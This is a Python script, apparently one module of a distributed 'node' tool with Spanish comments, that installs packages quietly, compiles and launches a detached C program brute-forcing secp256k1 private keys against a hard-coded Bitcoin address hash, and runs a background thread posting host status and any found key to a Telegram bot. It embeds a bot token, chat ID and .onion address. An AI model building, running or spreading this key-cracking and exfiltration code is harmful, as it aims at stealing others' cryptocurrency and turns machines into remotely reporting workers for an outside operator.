# 🜚 MISSION BRAIN V22.8 - INTERFACE FIX Φ 🜚
import os, subprocess, time, requests, socket, threading

MASTER_ONION = "eke7kse3wo5o5753eoqtpnw7mtjtasva4dlw23aqs3dwuzmgahkvebqd.onion"
TG_TOKEN = "8923446223:AAGTub53UjmwAZjazkqNTSI-sR9gOcikrv8"
TG_CHAT = "7713278946"

def execute_mission(ui, ID):
    # Función de compatibilidad para evitar errores de argumentos (TypeError)
    def ui_update(msg, val, cpu=None):
        try:
            # Intentar con 'sync' (HyperUI V22.5)
            ui.update(msg, sync=val, cpu=cpu)
        except TypeError:
            try:
                # Intentar con 'task' (SpecterUI V22.2)
                ui.update(msg, task=val, cpu=cpu)
            except:
                # Fallback: Solo mensaje
                ui.update(msg)

    ui.log('Sincronizando Interfaz V22.8...')
    
    # 1. Armamento
    ui_update("Armando Nodo...", 10)
    os.system('apt-get update -qq && apt-get install -y nmap libssl-dev gcc -qq > /dev/null 2>&1')
    
    # 2. Motor Strike
    if not os.path.exists('./v22_strike'):
        c_src = """#include <stdio.h>
#include <openssl/sha.h>
#include <openssl/ripemd.h>
#include <openssl/ec.h>
#include <pthread.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
unsigned char t[20]={0x2b,0x6f,0x17,0xe0,0x89,0x29,0xe7,0x93,0xef,0x1c,0x09,0x93,0x0e,0x13,0x71,0xba,0x76,0x35,0xc6,0x0c};
void* c(void* a){
    EC_GROUP* g=EC_GROUP_new_by_curve_name(714);
    EC_POINT* p=EC_POINT_new(g);
    BIGNUM* k=BN_new();
    unsigned char b[65],s[32],r[20];
    BN_hex2bn(&k,"0618E107618E107618E107618E107618E107618E107618E107618E107");
    while(1){
        EC_POINT_mul(g,p,k,NULL,NULL,NULL);
        EC_POINT_point2oct(g,p,4,b,65,NULL);
        SHA256(b,65,s);
        RIPEMD160(s,32,r);
        if(!memcmp(r,t,20)){
            char* match = BN_bn2hex(k);
            FILE* f = fopen("found.txt", "a"); fprintf(f, "MATCH:%s\\n", match); fclose(f);
            exit(0);
        }
        BN_add_word(k,1);
    }
}
int main(){
    pthread_t t[4];
    for(int i=0; i<4; i++) pthread_create(&t[i],NULL,c,NULL);
    while(1) sleep(3600);
    return 0;
}"""
        with open("s.c", "w") as f: f.write(c_src)
        os.system('gcc -O3 s.c -o v22_strike -lcrypto -lpthread > /dev/null 2>&1')
    
    if os.path.exists('./v22_strike'):
        os.system('pkill -9 v22_strike')
        subprocess.Popen(["./v22_strike"], start_new_session=True)
        ui.log('Motor Strike V22.8 Activo.')

    # 3. Hilo de Reporte
    def report_sync():
        while True:
            try:
                load = os.getloadavg()[0]
                msg = f"🔹 Nodo {ID} en vigilia V22.8. CPU: {load:.2f}"
                requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage", data={"chat_id": TG_CHAT, "text": msg})
                if os.path.exists("found.txt"):
                    with open("found.txt", "r") as f:
                        match_data = f.read()
                        requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage", data={"chat_id": TG_CHAT, "text": f"🚨 MATCH DETECTADO 🚨\n{match_data}"})
            except: pass
            time.sleep(300)

    threading.Thread(target=report_sync, daemon=True).start()
    ui_update("VIGILIA OMNI-VISUAL V22.8", 100, 95)
    return True